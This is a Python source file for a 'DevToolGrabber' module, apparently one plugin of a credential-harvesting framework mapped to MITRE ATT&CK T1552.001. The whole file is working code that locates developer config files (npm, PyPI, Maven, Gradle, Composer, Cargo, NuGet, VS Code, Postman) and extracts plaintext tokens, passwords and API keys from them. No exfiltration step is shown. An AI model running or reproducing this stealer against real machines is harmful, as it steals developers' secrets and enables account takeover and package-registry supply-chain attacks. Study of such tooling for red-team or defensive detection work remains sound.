"""
DevToolGrabber — Extract credentials from developer tools and configs

Targets:
- VS Code: settings.json (auth tokens, proxy passwords)
- Postman: environment files (API keys, bearer tokens)
- .npmrc: auth tokens for npm registries
- .pypirc: PyPI upload credentials
- Maven settings.xml: server passwords
- Gradle gradle.properties: credentials
- Composer auth.json: packagist tokens
- Cargo credentials.toml: crates.io tokens
- NuGet NuGet.Config: API keys
- Insomnia: environment files

MITRE ATT&CK: T1552.001 (Credentials In Files)
"""

from __future__ import annotations

import json
import os
import re

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class DevToolGrabber(GrabberModule):
    name = "dev_tools"
    description = "Extract credentials from VS Code, Postman, npm, pip, Maven, Gradle, NuGet"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _TARGETS: list[tuple[str, str, str]] = [
        # (path_template, parser_method, app_name)
        ("{home}/.npmrc", "_parse_npmrc", "npm"),
        ("{home}/.pypirc", "_parse_pypirc", "PyPI"),
        ("{home}/.m2/settings.xml", "_parse_maven_settings", "Maven"),
        ("{home}/.gradle/gradle.properties", "_parse_properties", "Gradle"),
        ("{home}/.composer/auth.json", "_parse_json_auth", "Composer"),
        ("{home}/.cargo/credentials.toml", "_parse_toml_tokens", "Cargo"),
        ("{home}/.nuget/NuGet.Config", "_parse_nuget_config", "NuGet"),
        # VS Code settings (multiple locations)
        ("{appdata}/Code/User/settings.json", "_parse_vscode_settings", "VS Code"),
        ("{home}/.config/Code/User/settings.json", "_parse_vscode_settings", "VS Code"),
        ("{home}/Library/Application Support/Code/User/settings.json", "_parse_vscode_settings", "VS Code"),
        # Postman environments
        ("{home}/Postman/environments", "_parse_postman_dir", "Postman"),
        ("{home}/.config/Postman/environments", "_parse_postman_dir", "Postman"),
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template, _, _ in self._TARGETS:
            path = self._expand(template, context)
            if path and (os.path.isfile(path) or os.path.isdir(path)):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        for template, parser_name, app_name in self._TARGETS:
            path = self._expand(template, context)
            if not path:
                continue

            try:
                parser = getattr(self, parser_name)

                if os.path.isdir(path):
                    creds = parser(path, app_name)
                elif os.path.isfile(path):
                    content = safe_read_text(path)
                    if content:
                        creds = parser(content, app_name)
                    else:
                        continue
                else:
                    continue

                result.credentials.extend(creds)
                if creds:
                    result.findings.append(self.make_finding(
                        file_path=path,
                        description=f"Extracted {len(creds)} credential(s) from {app_name}",
                        score=60 * min(len(creds), 3),
                        matched_value=app_name,
                    ))

            except Exception as e:
                self.logger.debug(f"Failed to parse {path}: {e}")

        result.status = GrabberStatus.COMPLETED
        return result

    def _expand(self, template: str, context: GrabberContext) -> str:
        return template.format(
            home=context.user_profile_path,
            appdata=context.appdata_roaming or context.user_profile_path,
        )

    # --- Parsers ---

    def _parse_npmrc(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse .npmrc for auth tokens and registry credentials."""
        creds = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # //registry.npmjs.org/:_authToken=npm_xxxx
            if "_authToken=" in line or "_auth=" in line or "_password=" in line:
                key, _, value = line.partition("=")
                value = value.strip().strip('"')
                registry = key.split("/:")[0].lstrip("/") if "/:" in key else "npmjs.org"
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="token",
                    target_application=app,
                    url=registry,
                    decrypted_value=value,
                    mitre_technique="T1552.001",
                ))
        return creds

    def _parse_pypirc(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse .pypirc for PyPI upload credentials."""
        import configparser
        creds = []
        config = configparser.ConfigParser()
        config.read_string(content)

        for section in config.sections():
            if section == "distutils":
                continue
            username = config.get(section, "username", fallback="")
            password = config.get(section, "password", fallback="")
            repository = config.get(section, "repository", fallback=section)

            if password:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application=app,
                    url=repository,
                    username=username,
                    decrypted_value=password,
                    mitre_technique="T1552.001",
                ))
        return creds

    def _parse_maven_settings(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse Maven settings.xml for server credentials."""
        creds = []
        # Regex extraction to avoid xml.etree namespace issues with Maven POM
        for match in re.finditer(
            r"<server>\s*<id>([^<]*)</id>\s*"
            r"(?:<username>([^<]*)</username>\s*)?"
            r"<password>([^<]*)</password>",
            content, re.DOTALL,
        ):
            server_id, username, password = match.groups()
            creds.append(ExtractedCredential(
                source_module=self.name,
                credential_type="password",
                target_application=app,
                url=server_id or "",
                username=username or "",
                decrypted_value=password or "",
                mitre_technique="T1552.001",
            ))
        return creds

    def _parse_properties(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse Java properties files for credential keys."""
        creds = []
        secret_keys = {"password", "token", "secret", "apikey", "api_key", "auth"}
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "=" in line:
                key, _, value = line.partition("=")
                key_lower = key.strip().lower()
                value = value.strip()
                if any(s in key_lower for s in secret_keys) and len(value) >= 4:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="token",
                        target_application=app,
                        username=key.strip(),
                        decrypted_value=value,
                        mitre_technique="T1552.001",
                    ))
        return creds

    def _parse_json_auth(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse JSON auth files (Composer auth.json, etc.)."""
        creds = []
        try:
            data = json.loads(content)
        except json.JSONDecodeError:
            return creds

        # Composer auth.json structure: {"http-basic": {"repo": {"username": "", "password": ""}}}
        for auth_type, entries in data.items():
            if isinstance(entries, dict):
                for host, auth_data in entries.items():
                    if isinstance(auth_data, dict):
                        token = auth_data.get("token", auth_data.get("password", ""))
                        user = auth_data.get("username", "")
                        if token:
                            creds.append(ExtractedCredential(
                                source_module=self.name,
                                credential_type="token" if "token" in auth_data else "password",
                                target_application=app,
                                url=host,
                                username=user,
                                decrypted_value=str(token),
                                mitre_technique="T1552.001",
                            ))
        return creds

    def _parse_toml_tokens(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse TOML-like credential files (Cargo credentials.toml)."""
        creds = []
        # Simple TOML parsing for token = "value" patterns
        for match in re.finditer(r'(?:token|secret|key)\s*=\s*"([^"]+)"', content, re.IGNORECASE):
            creds.append(ExtractedCredential(
                source_module=self.name,
                credential_type="token",
                target_application=app,
                decrypted_value=match.group(1),
                mitre_technique="T1552.001",
            ))
        return creds

    def _parse_nuget_config(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse NuGet.Config for API keys and package source credentials."""
        creds = []
        # Extract apikeys: <add key="url" value="apikey" />
        for match in re.finditer(
            r'<add\s+key="([^"]*)"[^/]*value="([^"]*)"',
            content, re.IGNORECASE,
        ):
            key, value = match.groups()
            if len(value) >= 10:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="token",
                    target_application=app,
                    url=key,
                    decrypted_value=value,
                    mitre_technique="T1552.001",
                ))
        return creds

    def _parse_vscode_settings(self, content: str, app: str) -> list[ExtractedCredential]:
        """Parse VS Code settings.json for credential-like values."""
        creds = []
        try:
            # VS Code settings may have comments — strip them
            cleaned = re.sub(r"//.*$", "", content, flags=re.MULTILINE)
            cleaned = re.sub(r"/\*.*?\*/", "", cleaned, flags=re.DOTALL)
            data = json.loads(cleaned)
        except json.JSONDecodeError:
            return creds

        secret_keys = {"token", "password", "secret", "apiKey", "apikey", "auth", "bearer"}

        def _walk(obj: dict, prefix: str = "") -> None:
            for k, v in obj.items():
                if isinstance(v, str) and len(v) >= 10:
                    if any(s in k.lower() for s in secret_keys):
                        creds.append(ExtractedCredential(
                            source_module=self.name,
                            credential_type="token",
                            target_application=app,
                            username=f"{prefix}.{k}" if prefix else k,
                            decrypted_value=v[:200],
                            mitre_technique="T1552.001",
                        ))
                elif isinstance(v, dict):
                    _walk(v, f"{prefix}.{k}" if prefix else k)

        _walk(data)
        return creds

    def _parse_postman_dir(self, dir_path: str, app: str) -> list[ExtractedCredential]:
        """Scan Postman environment files for API keys and tokens."""
        creds = []
        if not os.path.isdir(dir_path):
            return creds

        try:
            for entry in os.scandir(dir_path):
                if not entry.name.endswith(".json"):
                    continue
                content = safe_read_text(entry.path)
                if not content:
                    continue

                try:
                    data = json.loads(content)
                    for var in data.get("values", []):
                        key = var.get("key", "").lower()
                        value = var.get("value", "")
                        if isinstance(value, str) and len(value) >= 8:
                            if any(s in key for s in ("token", "key", "secret", "password", "auth", "bearer")):
                                creds.append(ExtractedCredential(
                                    source_module=self.name,
                                    credential_type="token",
                                    target_application=app,
                                    username=var.get("key", ""),
                                    decrypted_value=value[:200],
                                    notes=f"env: {data.get('name', entry.name)}",
                                    mitre_technique="T1552.001",
                                ))
                except json.JSONDecodeError:
                    continue
        except OSError:
            pass

        return creds
